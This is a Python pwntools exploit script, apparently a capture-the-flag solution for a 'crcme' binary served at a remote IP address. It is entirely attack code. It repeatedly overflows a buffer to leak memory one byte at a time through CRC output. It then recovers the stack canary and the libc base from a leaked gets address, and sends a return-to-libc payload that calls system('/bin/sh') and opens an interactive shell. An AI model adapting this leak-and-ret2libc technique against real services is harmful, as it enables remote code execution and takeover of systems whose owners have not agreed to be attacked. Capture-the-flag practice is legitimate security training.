from pwn import *
import pickle
look = pickle.load(open("crclookup"))

#s = process("./crcme_8416479dcf3a74133080df4f454cd0f76ec9cc8d")
s = remote("69.90.132.40", 4002)

def leak(addr):
	s.sendline("1")
	s.sendline("1")
	s.sendline("A"*(0x64)+p64(addr))

	print hex(addr)
	s.recvuntil("is: ")
	crc = s.recvline()

	byte = look[int(crc,16)]
	if byte == 0xa:
		byte = 0

	return byte

size = 0
sizeaddr = 0x0804A040
for i in xrange(4):
	size |= leak(sizeaddr+i)<<(8*i)

print hex(size)

cookieaddr = size-0x34
cookie = 0
for i in xrange(4):
	cookie |= leak(cookieaddr+i)<<(8*i)

cookie &= 0xffffff00

print hex(cookie)

getsaddr = 0x8049FDC
gets = 0
for i in xrange(4):
	gets |= leak(getsaddr+i)<<(8*i)

'''
# server soooo slow, commenting this out
setvbufaddr = 0x8049FF4
setvbuf = 0
for i in xrange(4):
	setvbuf |= leak(setvbufaddr+i)<<(8*i)

print "gets %x setvbuf %x" % (gets, setvbuf)
'''

libc = ELF("libc.so")

libc.address = gets-libc.symbols['gets']
print hex(libc.address)

addr = libc.symbols['system']
print hex(addr)
buf = "A"*0x28
buf += p32(cookie)
buf += "B"*0xc
buf += p32(addr)
buf += p32(next(libc.search("/bin/sh\x00")))
buf += p32(next(libc.search("/bin/sh\x00")))
buf += p32(next(libc.search("/bin/sh\x00")))
s.sendline(buf)

s.interactive()
